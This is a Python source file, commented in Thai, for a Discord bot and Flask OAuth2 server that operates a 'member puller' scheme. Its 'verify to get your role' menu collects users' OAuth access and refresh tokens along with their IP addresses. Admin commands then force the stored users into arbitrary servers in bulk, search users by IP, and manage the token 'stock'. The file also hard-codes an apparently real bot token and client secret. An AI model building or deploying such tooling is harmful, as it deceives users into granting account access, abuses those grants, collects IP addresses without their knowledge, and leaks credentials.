import discord
from discord import app_commands
from discord.ext import commands
from flask import Flask, request, render_template_string, jsonify
import requests, sqlite3, time, threading, asyncio, aiohttp, json, io

# --- [ 1. Configuration - ตั้งค่าระบบ ] ---
TOKEN = 'MTU0ODU2NDI2NDc3NDY3MjM4NQ.GSPe-B.O_YuTaE1O03yC391VV36MWXxEgpbpvwA7HoBHM'            # ใส่ Bot Token ของคุณ
CLIENT_ID = '1548564264774672385'        # Client ID ของ Discord Bot
CLIENT_SECRET = 'dy83iRv9QTNf75DK8XVhIbjAN4xRoB9W' # Client Secret ของ Discord Bot
REDIRECT_URI = 'https://kokoobot-web.onrender.com/callback' # URL Callback OAuth2
PORT_WISP = 8080

RAZEN_ID = 1534537336786911388
ADMIN_IDS = [RAZEN_ID]                   # ไอดีผู้ใช้ที่มีสิทธิ์ใช้คำสั่งควบคุม

app = Flask(__name__)
is_pulling_active = False                # สถานะควบคุมการดึงคนเบื้องหลัง
pull_stats = {"total": 0, "success": 0, "fail": 0, "running": False}

# --- [ 2. Database Functions ] ---
def init_db():
    conn = sqlite3.connect('users.db')
    cursor = conn.cursor()
    cursor.execute('''CREATE TABLE IF NOT EXISTS users 
                      (user_id TEXT PRIMARY KEY, username TEXT, access_token TEXT, refresh_token TEXT, expires_at INTEGER, ip_address TEXT)''')
    cursor.execute('''CREATE TABLE IF NOT EXISTS settings 
                      (guild_id TEXT PRIMARY KEY, log_channel_id TEXT, history_channel_id TEXT)''')
    cursor.execute('''CREATE TABLE IF NOT EXISTS points 
                      (user_id TEXT PRIMARY KEY, points INTEGER DEFAULT 0)''')
    cursor.execute('''CREATE TABLE IF NOT EXISTS locked_users 
                      (user_id TEXT PRIMARY KEY, reason TEXT)''')
    conn.commit()
    conn.close()

def db_query(query, params=(), fetch=False):
    conn = sqlite3.connect('users.db', timeout=30)
    cursor = conn.cursor()
    cursor.execute(query, params)
    data = cursor.fetchall() if fetch else None
    conn.commit()
    conn.close()
    return data

# --- [ 3. UI Components ] ---
class DirectOAuthLinkView(discord.ui.View):
    def __init__(self, label: str, emoji: str, oauth_url: str):
        super().__init__(timeout=None)
        button_emoji = emoji if emoji else None
        self.add_item(discord.ui.Button(
            style=discord.ButtonStyle.link,
            label=label,
            emoji=button_emoji,
            url=oauth_url
        ))

class RoleSelectMenu(discord.ui.Select):
    def __init__(self):
        options = [
            discord.SelectOption(label="เขียนโปรแกรม", description="สำหรับผู้ที่สนใจเกี่ยวกับการเขียนโปรแกรม", emoji="💻", value="role_coding"),
            discord.SelectOption(label="วาดภาพ", description="สำหรับผู้ที่ชื่นชอบงานศิลปะและการวาดภาพ", emoji="🎨", value="role_art"),
            discord.SelectOption(label="ตัดต่อ", description="สำหรับผู้ที่สนใจงานตัดต่อวิดีโอและสื่อ", emoji="🎬", value="role_editing"),
            discord.SelectOption(label="เล่นเกม", description="สำหรับสายเกมเมอร์ที่ต้องการหาเพื่อนเล่นเกม", emoji="🎮", value="role_gaming")
        ]
        super().__init__(placeholder="เลือกยศของคุณ...", min_values=1, max_values=1, options=options, custom_id="rules_select")

    async def callback(self, interaction: discord.Interaction):
        state_param = f"{interaction.guild_id}_0"
        oauth_url = f"https://discord.com/api/oauth2/authorize?client_id={CLIENT_ID}&redirect_uri={requests.utils.quote(REDIRECT_URI)}&response_type=code&scope=identify%20guilds.join&state={state_param}"
        await interaction.response.send_message(f"🔒 ยืนยันตัวตนเพื่อรับยศ: [กดที่นี่เพื่อยืนยันตัวตน]({oauth_url})", ephemeral=True)

class RoleSelectView(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=None)
        self.add_item(RoleSelectMenu())

# --- [ 4. Bot Setup ] ---
class TokenUserBot(commands.Bot):
    def __init__(self):
        super().__init__(command_prefix="!", intents=discord.Intents.all())

    async def setup_hook(self):
        init_db()
        self.add_view(RoleSelectView())

bot = TokenUserBot()

@bot.event
async def on_ready():
    print(f'🔥 บอทออนไลน์แล้วในชื่อ: {bot.user.name}')
    
    # ตั้งค่าสถานะเป็น "กำลังดู maggiearawad System"
    activity = discord.Activity(
        type=discord.ActivityType.watching, 
        name="maggiearawad System"
    )
    await bot.change_presence(activity=activity)
    
    try:
        synced = await bot.tree.sync()
        print(f"✅ ซิงค์ Slash Commands ลง Discord เรียบร้อยทั้งหมด {len(synced)} คำสั่ง!")
    except Exception as e:
        print(f"❌ เกิดข้อผิดพลาดในการซิงค์คำสั่ง: {e}")

def is_admin(interaction: discord.Interaction) -> bool:
    return interaction.user.id in ADMIN_IDS

async def background_pull_process(guild_id: int, amount: int = 0, role: discord.Role = None, user_ids: list = None):
    global is_pulling_active, pull_stats
    is_pulling_active = True
    
    if user_ids:
        placeholders = ','.join('?' for _ in user_ids)
        users = db_query(f"SELECT user_id, access_token FROM users WHERE user_id IN ({placeholders})", tuple(user_ids), fetch=True) or []
    else:
        users = db_query("SELECT user_id, access_token FROM users", fetch=True) or []
    
    if amount > 0:
        users = users[:amount]

    pull_stats = {"total": len(users), "success": 0, "fail": 0, "running": True}
    headers = {"Authorization": f"Bot {TOKEN}", "Content-Type": "application/json"}
    
    for user_id, access_token in users:
        if not is_pulling_active:
            break
        
        url = f"https://discord.com/api/v10/guilds/{guild_id}/members/{user_id}"
        data = {"access_token": access_token}
        if role:
            data["roles"] = [str(role.id)]
        
        async with aiohttp.ClientSession() as session:
            async with session.put(url, headers=headers, json=data) as resp:
                if resp.status in [201, 204]:
                    pull_stats["success"] += 1
                else:
                    pull_stats["fail"] += 1
        await asyncio.sleep(1.5)
        
    pull_stats["running"] = False
    is_pulling_active = False

# --- [ 5. Slash Commands ทั้งหมด ] ---

# 1. /แก้ไขembed
@bot.tree.command(name="แก้ไขembed", description="แก้ไข Embed ที่บอทเคยส่ง (แก้ไขหัวข้อ คำอธิบาย ความสามารถ อีโมจิ โค้ดสี รูปภาพ)")
async def cmd_edit_embed(interaction: discord.Interaction, message_id: str, title: str = None, description: str = None, color: str = None, image_url: str = None):
    if not is_admin(interaction): return await interaction.response.send_message("❌ ไม่อนุญาตให้ใช้คำสั่งนี้", ephemeral=True)
    try:
        msg = await interaction.channel.fetch_message(int(message_id))
        embed = msg.embeds[0] if msg.embeds else discord.Embed()
        if title: embed.title = title
        if description: embed.description = description
        if color:
            try: embed.color = int(color.replace("#", ""), 16)
            except: pass
        if image_url: embed.set_image(url=image_url)
        await msg.edit(embed=embed)
        await interaction.response.send_message("✅ แก้ไข Embed เรียบร้อยแล้ว!", ephemeral=True)
    except Exception as e:
        await interaction.response.send_message(f"❌ เกิดข้อผิดพลาด: {e}", ephemeral=True)

# 2. /ค้นหา
@bot.tree.command(name="ค้นหา", description="ค้นหาข้อมูลผู้ใช้จาก User ID หรือ IP Address")
async def cmd_search_user(interaction: discord.Interaction, query: str):
    if not is_admin(interaction): return await interaction.response.send_message("❌ ไม่อนุญาตให้ใช้คำสั่งนี้", ephemeral=True)
    user_data = db_query("SELECT user_id, username, ip_address, expires_at FROM users WHERE user_id = ? OR ip_address = ?", (query, query), fetch=True)
    if not user_data:
        return await interaction.response.send_message("❌ ไม่พบข้อมูลในระบบ", ephemeral=True)
    u = user_data[0]
    embed = discord.Embed(title="🔍 ผลการค้นหาผู้ใช้", color=0x3498DB)
    embed.add_field(name="User ID", value=u[0], inline=False)
    embed.add_field(name="Username", value=u[1], inline=False)
    embed.add_field(name="IP Address", value=u[2] if u[2] else "ไม่มีข้อมูล", inline=False)
    embed.add_field(name="สถานะ Token", value="ใช้งานได้" if u[3] > time.time() else "หมดอายุ", inline=False)
    await interaction.response.send_message(embed=embed, ephemeral=True)

# 3. /แจกยศ
@bot.tree.command(name="แจกยศ", description="ใส่ยศให้ผู้ใช้ทั้งหมดที่ยังรีเฟรชโทเคนได้")
async def cmd_give_roles(interaction: discord.Interaction, role: discord.Role):
    if not is_admin(interaction): return await interaction.response.send_message("❌ ไม่อนุญาตให้ใช้คำสั่งนี้", ephemeral=True)
    await interaction.response.defer(ephemeral=True)
    users = db_query("SELECT user_id FROM users", fetch=True) or []
    success = 0
    for u in users:
        member = interaction.guild.get_member(int(u[0]))
        if member:
            try:
                await member.add_roles(role)
                success += 1
            except: pass
    await interaction.followup.send(f"✅ แจกยศ {role.mention} ให้สมาชิกสำเร็จ {success} คน!")

# 4. /เช็คpoint
@bot.tree.command(name="เช็คpoint", description="เช็คจำนวน Point คงเหลือ (แอดมินสามารถระบุคนอื่นได้)")
async def cmd_check_point(interaction: discord.Interaction, user: discord.User = None):
    target = user or interaction.user
    res = db_query("SELECT points FROM points WHERE user_id = ?", (str(target.id),), fetch=True)
    pts = res[0][0] if res else 0
    await interaction.response.send_message(f"🪙 ผู้ใช้ {target.mention} มี Point คงเหลือ: **{pts}** Points", ephemeral=True)

# 5. /เช็คสต็อก
@bot.tree.command(name="เช็คสต็อก", description="เช็คข้อมูล SQL สต็อก")
async def cmd_check_sql_stock(interaction: discord.Interaction):
    if not is_admin(interaction): return await interaction.response.send_message("❌ ไม่อนุญาตให้ใช้คำสั่งนี้", ephemeral=True)
    total = db_query("SELECT COUNT(*) FROM users", fetch=True)[0][0]
    valid = db_query("SELECT COUNT(*) FROM users WHERE expires_at > ?", (int(time.time()),), fetch=True)[0][0]
    embed = discord.Embed(title="📊 ข้อมูลฐานข้อมูล SQL สต็อก", color=0x9B59B6)
    embed.add_field(name="จำนวน Token ทั้งหมด", value=f"`{total}` Token", inline=False)
    embed.add_field(name="Token ที่พร้อมใช้งาน", value=f"`{valid}` Token", inline=False)
    embed.add_field(name="Token ที่หมดอายุ", value=f"`{total - valid}` Token", inline=False)
    await interaction.response.send_message(embed=embed, ephemeral=True)

# 6. /ดึงคน
@bot.tree.command(name="ดึงคน", description="🚀 ระดมคนเข้าเซิร์ฟเวอร์")
async def cmd_pull(interaction: discord.Interaction, amount: int = 0, role: discord.Role = None):
    if not is_admin(interaction): return await interaction.response.send_message("❌ ไม่อนุญาตให้ใช้คำสั่งนี้", ephemeral=True)
    if is_pulling_active: return await interaction.response.send_message("⚠️ ระบบกำลังทำงานดึงคนอยู่", ephemeral=True)
    asyncio.create_task(background_pull_process(interaction.guild_id, amount, role))
    await interaction.response.send_message(f"🚀 เริ่มกระบวนการระดมคนเข้าเซิร์ฟเวอร์เรียบร้อย!", ephemeral=True)

# 7. /ตั้งค่าซื้อยศ
@bot.tree.command(name="ตั้งค่าซื้อยศ", description="สร้าง Embed ร้านค้าซื้อยศด้วย Point พร้อมส่งไปยังห้องที่เลือก")
async def cmd_setup_role_shop(interaction: discord.Interaction, channel: discord.TextChannel, title: str, role: discord.Role, price: int, description: str = "กดปุ่มด้านล่างเพื่อซื้อยศ"):
    if not is_admin(interaction): return await interaction.response.send_message("❌ ไม่อนุญาตให้ใช้คำสั่งนี้", ephemeral=True)
    embed = discord.Embed(title=title, description=f"{description}\n\n🏷️ ยศที่จะได้รับ: {role.mention}\n💰 ราคา: **{price}** Points", color=0xF1C40F)
    
    class BuyRoleView(discord.ui.View):
        def __init__(self): super().__init__(timeout=None)
        @discord.ui.button(label=f"ซื้อยศ ({price} Points)", style=discord.ButtonStyle.green, custom_id=f"buy_role_{role.id}_{price}")
        async def buy_btn(self, inter: discord.Interaction, btn: discord.ui.Button):
            res = db_query("SELECT points FROM points WHERE user_id = ?", (str(inter.user.id),), fetch=True)
            pts = res[0][0] if res else 0
            if pts < price:
                return await inter.response.send_message("❌ Point ของคุณไม่เพียงพอ!", ephemeral=True)
            db_query("UPDATE points SET points = points - ? WHERE user_id = ?", (price, str(inter.user.id)))
            await inter.user.add_roles(role)
            await inter.response.send_message(f"🎉 คุณได้รับยศ {role.mention} เรียบร้อยแล้ว!", ephemeral=True)

    await channel.send(embed=embed, view=BuyRoleView())
    await interaction.response.send_message(f"✅ สร้างร้านค้าซื้อยศในช่อง {channel.mention} เรียบร้อยแล้ว!", ephemeral=True)

# 8. /ถอดยศ
@bot.tree.command(name="ถอดยศ", description="ถอดยศให้คนทีรีเฟรช Token ไม่ได้")
async def cmd_remove_invalid_roles(interaction: discord.Interaction, role: discord.Role):
    if not is_admin(interaction): return await interaction.response.send_message("❌ ไม่อนุญาตให้ใช้คำสั่งนี้", ephemeral=True)
    await interaction.response.defer(ephemeral=True)
    invalid_users = db_query("SELECT user_id FROM users WHERE expires_at <= ?", (int(time.time()),), fetch=True) or []
    removed = 0
    for u in invalid_users:
        member = interaction.guild.get_member(int(u[0]))
        if member and role in member.roles:
            try:
                await member.remove_roles(role)
                removed += 1
            except: pass
    await interaction.followup.send(f"✅ ถอดยศ {role.mention} จากผู้ใช้ที่ Token หมดอายุสำเร็จ {removed} คน!")

# 9. /บุคคล id
@bot.tree.command(name="บุคคล_id", description="ดึงสมาชิกตาม User ID")
async def cmd_pull_by_id(interaction: discord.Interaction, user_id: str, role: discord.Role = None):
    if not is_admin(interaction): return await interaction.response.send_message("❌ ไม่อนุญาตให้ใช้คำสั่งนี้", ephemeral=True)
    asyncio.create_task(background_pull_process(interaction.guild_id, user_ids=[user_id], role=role))
    await interaction.response.send_message(f"🚀 กำลังดึงผู้ใช้ ID `{user_id}` เข้าเซิร์ฟเวอร์...", ephemeral=True)

# 10. /บุคคล จำนวน
@bot.tree.command(name="บุคคล_จำนวน", description="ดึงสมาชิกตามจำนวน")
async def cmd_pull_by_amount(interaction: discord.Interaction, amount: int, role: discord.Role = None):
    if not is_admin(interaction): return await interaction.response.send_message("❌ ไม่อนุญาตให้ใช้คำสั่งนี้", ephemeral=True)
    asyncio.create_task(background_pull_process(interaction.guild_id, amount=amount, role=role))
    await interaction.response.send_message(f"🚀 กำลังดึงผู้ใช้จำนวน `{amount}` คนเข้าเซิร์ฟเวอร์...", ephemeral=True)

# 11. /พี่ไวท์594
@bot.tree.command(name="พี่ไวท์594", description="ซิงค์คำสั่งใหม่ทั้งหมด")
async def cmd_sync_commands(interaction: discord.Interaction):
    if not is_admin(interaction): return await interaction.response.send_message("❌ ไม่อนุญาตให้ใช้คำสั่งนี้", ephemeral=True)
    synced = await bot.tree.sync()
    await interaction.response.send_message(f"🔄 ซิงค์คำสั่ง Slash ทั้งหมด {len(synced)} คำสั่งเรียบร้อยแล้ว!", ephemeral=True)

# 12. /เพิ่มpoint
@bot.tree.command(name="เพิ่มpoint", description="เพิ่ม Point ให้กับผู้ใช้ (เฉพาะแอดมิน)")
async def cmd_add_point(interaction: discord.Interaction, user: discord.User, amount: int):
    if not is_admin(interaction): return await interaction.response.send_message("❌ ไม่อนุญาตให้ใช้คำสั่งนี้", ephemeral=True)
    db_query("INSERT INTO points (user_id, points) VALUES (?, ?) ON CONFLICT(user_id) DO UPDATE SET points = points + ?", (str(user.id), amount, amount))
    await interaction.response.send_message(f"✅ เพิ่ม {amount} Point ให้กับ {user.mention} เรียบร้อยแล้ว!", ephemeral=True)

# 13. /ลงห้อง
@bot.tree.command(name="ลงห้อง", description="ให้บอทเข้าห้องเสียงของคุณ")
async def cmd_join_vc(interaction: discord.Interaction):
    if not interaction.user.voice: return await interaction.response.send_message("❌ คุณต้องอยู่ในห้องเสียงก่อน!", ephemeral=True)
    channel = interaction.user.voice.channel
    await channel.connect()
    await interaction.response.send_message(f"🔊 บอทเชื่อมต่อเข้าห้องเสียง {channel.mention} เรียบร้อยแล้ว!", ephemeral=True)

# 14. /ลดpoint
@bot.tree.command(name="ลดpoint", description="ลด Point ของผู้ใช้ (เฉพาะแอดมิน)")
async def cmd_remove_point(interaction: discord.Interaction, user: discord.User, amount: int):
    if not is_admin(interaction): return await interaction.response.send_message("❌ ไม่อนุญาตให้ใช้คำสั่งนี้", ephemeral=True)
    db_query("INSERT INTO points (user_id, points) VALUES (?, 0) ON CONFLICT(user_id) DO UPDATE SET points = MAX(0, points - ?)", (str(user.id), amount))
    await interaction.response.send_message(f"✅ ลด {amount} Point ของผู้ใช้ {user.mention} เรียบร้อยแล้ว!", ephemeral=True)

# 15. /ล็อคไอดี เพิ่ม / ลายการ / ลบ
lock_group = app_commands.Group(name="ล็อคไอดี", description="จัดการการล็อค User ID")

@lock_group.command(name="เพิ่ม", description="เพิ่ม User ID เข้าในรายการล็อค")
async def lock_add(interaction: discord.Interaction, user_id: str, reason: str = "ไม่ระบุสาเหตุ"):
    if not is_admin(interaction): return await interaction.response.send_message("❌ ไม่อนุญาตให้ใช้คำสั่งนี้", ephemeral=True)
    db_query("INSERT OR REPLACE INTO locked_users VALUES (?, ?)", (user_id, reason))
    await interaction.response.send_message(f"🔒 ล็อค User ID `{user_id}` เรียบร้อยแล้ว! (สาเหตุ: {reason})", ephemeral=True)

@lock_group.command(name="รายการ", description="ดูรายการ User ID ที่ถูกล็อคอยูู่ทั้งหมด")
async def lock_list(interaction: discord.Interaction):
    if not is_admin(interaction): return await interaction.response.send_message("❌ ไม่อนุญาตให้ใช้คำสั่งนี้", ephemeral=True)
    rows = db_query("SELECT user_id, reason FROM locked_users", fetch=True) or []
    if not rows: return await interaction.response.send_message("📜 ไม่มี User ID ที่ถูกล็อคในระบบ", ephemeral=True)
    txt = "\n".join([f"• `{r[0]}` - {r[1]}" for r in rows])
    await interaction.response.send_message(f"🔒 **รายการ User ID ที่ถูกล็อค:**\n{txt}", ephemeral=True)

@lock_group.command(name="ลบ", description="ลบ User ID ออกจากรายการล็อค")
async def lock_remove(interaction: discord.Interaction, user_id: str):
    if not is_admin(interaction): return await interaction.response.send_message("❌ ไม่อนุญาตให้ใช้คำสั่งนี้", ephemeral=True)
    db_query("DELETE FROM locked_users WHERE user_id = ?", (user_id,))
    await interaction.response.send_message(f"🔓 ปดล็อค User ID `{user_id}` เรียบร้อยแล้ว!", ephemeral=True)

bot.tree.add_command(lock_group)

# 18. /ล้างสต็อก
@bot.tree.command(name="ล้างสต็อก", description="ลบ Token ที่ตายแล้ว")
async def cmd_clean_stock(interaction: discord.Interaction):
    if not is_admin(interaction): return await interaction.response.send_message("❌ ไม่อนุญาตให้ใช้คำสั่งนี้", ephemeral=True)
    db_query("DELETE FROM users WHERE expires_at <= ?", (int(time.time()),))
    await interaction.response.send_message("🧹 ลบ Token ที่หมดอายุ/ตาย ออกจากคลังเรียบร้อยแล้ว!", ephemeral=True)

# 19. /สต็อก
@bot.tree.command(name="สต็อก", description="เช็คจำนวนคนในคลัง")
async def cmd_check_stock(interaction: discord.Interaction):
    total_users = db_query("SELECT COUNT(*) FROM users", fetch=True)[0][0]
    await interaction.response.send_message(f"📦 จำนวนสมาชิกที่มีในคลังทั้งหมด: **{total_users}** คน", ephemeral=True)

# 20. /ออกห้อง
@bot.tree.command(name="ออกห้อง", description="ให้บอทออกจากห้องเสียง")
async def cmd_leave_vc(interaction: discord.Interaction):
    if interaction.guild.voice_client:
        await interaction.guild.voice_client.disconnect()
        await interaction.response.send_message("🔇 บอทออกจากห้องเสียงเรียบร้อยแล้ว!", ephemeral=True)
    else:
        await interaction.response.send_message("❌ บอทไม่ได้อยู่ในห้องเสียงใดๆ", ephemeral=True)

# --- [ 6. OAuth2 Web Callback Server & HTML UI ] ---
HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="th">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>594 VFV — Verify</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Kanit:wght@300;400;500;600;700&display=swap');
        
        body { 
            font-family: 'Kanit', sans-serif;
            background: linear-gradient(rgba(0, 0, 0, 0.65), rgba(0, 0, 0, 0.65)), 
                        url('https://images.unsplash.com/photo-1518709268805-4e9042af9f23?q=80&w=1920&auto=format&fit=crop');
            background-size: cover;
            background-position: center;
            background-repeat: no-repeat;
            background-attachment: fixed;
        }

        .glass-card { 
            background: rgba(18, 5, 8, 0.75); 
            backdrop-filter: blur(16px); 
            -webkit-backdrop-filter: blur(16px);
            border: 1px solid rgba(255, 50, 50, 0.15); 
            box-shadow: 0 0 40px rgba(0, 0, 0, 0.8), 0 0 15px rgba(220, 38, 38, 0.2);
        }

        .user-card {
            background: rgba(255, 255, 255, 0.03);
            border: 1px solid rgba(255, 255, 255, 0.08);
        }

        .btn-discord {
            background: linear-gradient(135deg, #e11d48 0%, #991b1b 100%);
            box-shadow: 0 4px 15px rgba(225, 29, 72, 0.4);
            transition: all 0.2s ease;
        }

        .btn-discord:hover {
            transform: translateY(-2px);
            box-shadow: 0 6px 20px rgba(225, 29, 72, 0.6);
        }

        .loader { 
            border: 3px solid rgba(255, 255, 255, 0.1); 
            border-radius: 50%; 
            border-top: 3px solid #ef4444; 
            width: 42px; 
            height: 42px; 
            animation: spin 1s linear infinite; 
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body class="flex items-center justify-center min-h-screen p-4 text-white">

    <!-- Loading State -->
    <div id="loading-box" class="glass-card p-8 rounded-3xl text-center max-w-md w-full">
        <div class="loader mx-auto mb-5"></div>
        <h2 class="text-xl font-bold mb-2">กำลังตรวจสอบสิทธิ์ Discord...</h2>
        <p class="text-gray-400 text-sm">อย่าปิดหน้านี้ ระบบกำลังทำการยืนยันตัวตน</p>
    </div>

    <!-- Success State -->
    <div id="success-box" class="hidden glass-card p-8 rounded-3xl text-center max-w-md w-full">
        <!-- Logo -->
        <div class="flex justify-center mb-4">
            <div class="w-16 h-16 rounded-full bg-black/60 border border-red-500/30 flex items-center justify-center shadow-lg">
                <span class="text-red-500 font-extrabold text-xl tracking-wider">594</span>
            </div>
        </div>

        <p class="text-red-500 font-semibold text-xs tracking-widest uppercase mb-1">SERVER VERIFY</p>
        <h1 class="text-3xl font-extrabold mb-1">Verify Success</h1>
        <p class="text-gray-300 text-sm font-medium mb-6">ยืนยันตัวตนสำเร็จ</p>

        <!-- User Info Card -->
        <div class="user-card rounded-2xl p-4 flex items-center gap-4 mb-6 text-left">
            <img id="user-avatar" class="w-14 h-14 rounded-full border-2 border-red-600/50 object-cover" src="" alt="Avatar">
            <div>
                <h3 id="user-name" class="font-bold text-base text-white"></h3>
                <span class="text-xs text-emerald-400 bg-emerald-500/10 px-2 py-0.5 rounded-full border border-emerald-500/20 font-medium inline-block mt-0.5">
                    Success Member
                </span>
            </div>
        </div>

        <p class="text-gray-400 text-xs leading-relaxed mb-6">
            ระบบได้ยืนยันตัวตนของคุณเรียบร้อยแล้ว<br>ตอนนี้คุณสามารถกดกลับสู่ Discord ได้ทันที
        </p>

        <!-- Account Verified Status Bar -->
        <div class="w-full bg-red-950/40 border border-red-900/50 text-red-300 text-xs py-2.5 rounded-xl font-medium mb-4">
            Account Verified
        </div>

        <!-- Return to Discord Button -->
        <a href="discord://" class="btn-discord text-white w-full py-3 rounded-xl font-semibold text-sm flex items-center justify-center gap-2 mb-6">
            <i class="fa-brands fa-discord text-lg"></i> กลับสู่ Discord
        </a>

        <!-- Social Icons -->
        <div class="flex justify-center gap-4 mb-6 text-gray-400">
            <a href="#" class="w-9 h-9 rounded-full bg-white/5 border border-white/10 flex items-center justify-center hover:text-white hover:bg-white/10 transition">
                <i class="fa-brands fa-discord text-sm"></i>
            </a>
            <a href="#" class="w-9 h-9 rounded-full bg-white/5 border border-white/10 flex items-center justify-center hover:text-white hover:bg-white/10 transition">
                <i class="fa-brands fa-instagram text-sm"></i>
            </a>
            <a href="#" class="w-9 h-9 rounded-full bg-white/5 border border-white/10 flex items-center justify-center hover:text-white hover:bg-white/10 transition">
                <i class="fa-brands fa-youtube text-sm"></i>
            </a>
            <a href="#" class="w-9 h-9 rounded-full bg-white/5 border border-white/10 flex items-center justify-center hover:text-white hover:bg-white/10 transition">
                <i class="fa-solid fa-globe text-sm"></i>
            </a>
        </div>

        <!-- Footer Text -->
        <div class="text-[11px] text-gray-500 space-y-0.5">
            <p>© 2026 Discord Server 594</p>
            <p>Powered by Whitecrown594</p>
        </div>
    </div>

    <script>
        const urlParams = new URLSearchParams(window.location.search);
        const code = urlParams.get('code');
        const state = urlParams.get('state');

        if (code) {
            fetch(`/api/process-oauth?code=${code}&state=${state}`)
                .then(res => res.json())
                .then(data => {
                    if (data.success) {
                        document.getElementById('user-avatar').src = data.user_avatar;
                        document.getElementById('user-name').innerText = data.username;
                        
                        document.getElementById('loading-box').classList.add('hidden');
                        document.getElementById('success-box').classList.remove('hidden');
                    } else {
                        alert('เกิดข้อผิดพลาด: ' + data.error);
                    }
                })
                .catch(() => alert('เกิดข้อผิดพลาดในการเชื่อมต่อเซิร์ฟเวอร์'));
        }
    </script>
</body>
</html>
"""

@app.route('/')
def home():
    return "Bot is running online 24/7!"

@app.route('/callback')
@app.route('/oauth-callback.html')
def callback_page():
    return render_template_string(HTML_TEMPLATE)

@app.route('/api/process-oauth')
def process_oauth():
    code = request.args.get('code')
    state = request.args.get('state')
    user_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    
    if not code:
        return jsonify({'success': False, 'error': 'No code provided'})
    
    res = requests.post("https://discord.com/api/oauth2/token", data={
        'client_id': CLIENT_ID, 
        'client_secret': CLIENT_SECRET, 
        'grant_type': 'authorization_code', 
        'code': code, 
        'redirect_uri': REDIRECT_URI
    }).json()
    
    at = res.get('access_token')
    if not at:
        return jsonify({'success': False, 'error': 'Failed to get Access Token'})

    u = requests.get("https://discord.com/api/v10/users/@me", headers={'Authorization': f'Bearer {at}'}).json()
    user_id = u['id']
    username = u.get('username', 'Unknown User')
    avatar_id = u.get('avatar')
    user_avatar = f"https://cdn.discordapp.com/avatars/{user_id}/{avatar_id}.png" if avatar_id else "https://cdn.discordapp.com/embed/avatars/0.png"
    
    db_query("INSERT OR REPLACE INTO users VALUES (?, ?, ?, ?, ?, ?)", 
             (user_id, username, at, res.get('refresh_token'), int(time.time()) + res.get('expires_in', 0), user_ip))
    
    server_name_display = "KokooBot Community"
    server_icon_url = "https://cdn.discordapp.com/embed/avatars/0.png"
    target_guild_id = None
    
    if state and "_" in state:
        try:
            guild_id, role_id = state.split("_")
            target_guild_id = guild_id
            bot_headers = {"Authorization": f"Bot {TOKEN}", "Content-Type": "application/json"}
            
            g_info = requests.get(f"https://discord.com/api/v10/guilds/{guild_id}", headers=bot_headers).json()
            if "name" in g_info:
                server_name_display = g_info["name"]
            if "icon" in g_info and g_info["icon"]:
                server_icon_url = f"https://cdn.discordapp.com/icons/{guild_id}/{g_info['icon']}.png"
            
            # ดึงผู้ใช้เข้าเซิร์ฟเวอร์
            requests.put(f"https://discord.com/api/v10/guilds/{guild_id}/members/{user_id}", headers=bot_headers, json={"access_token": at})
            
            # มอบยศ
            if role_id != "0":
                requests.put(f"https://discord.com/api/v10/guilds/{guild_id}/members/{user_id}/roles/{role_id}", headers=bot_headers)
        except Exception as e:
            print(f"เกิดข้อผิดพลาด OAuth: {e}")

    # แจ้งเตือนลง Discord Channel
    async def send_verify_log():
        try:
            if not target_guild_id: return
            log_setting = db_query("SELECT log_channel_id FROM settings WHERE guild_id = ?", (target_guild_id,), fetch=True)
            total_users = db_query("SELECT COUNT(*) FROM users", fetch=True)[0][0]

            embed = discord.Embed(title="🔔 สมาชิกใหม่ทำการยืนยันตัวตน!", color=0x2ECC71)
            embed.add_field(name="👤 ชื่อ", value=f"`{username}`", inline=True)
            embed.add_field(name="🆔 ไอดี", value=f"`{user_id}`", inline=True)
            embed.add_field(name="📊 คลังรวมทั้งหมด", value=f"`{total_users}` ราย", inline=False)
            embed.set_thumbnail(url=user_avatar)
            embed.timestamp = discord.utils.utcnow()

            if log_setting and log_setting[0][0]:
                channel = bot.get_channel(int(log_setting[0][0]))
                if channel: await channel.send(embed=embed)
        except Exception as e:
            print(f"Error logging: {e}")

    asyncio.run_coroutine_threadsafe(send_verify_log(), bot.loop)

    return jsonify({
        'success': True,
        'username': username,
        'user_avatar': user_avatar,
        'server_name': server_name_display,
        'server_icon': server_icon_url
    })

# --- [ 7. Execution Start ] ---
def run_flask():
    app.run(host='0.0.0.0', port=PORT_WISP, debug=False, use_reloader=False)

if __name__ == '__main__':
    # รัน Flask บน Thread แยกต่างหากก่อนเริ่ม Discord Bot
    threading.Thread(target=run_flask, daemon=True).start()
    
    # รัน Discord Bot เป็น Process หลัก
    bot.run(TOKEN)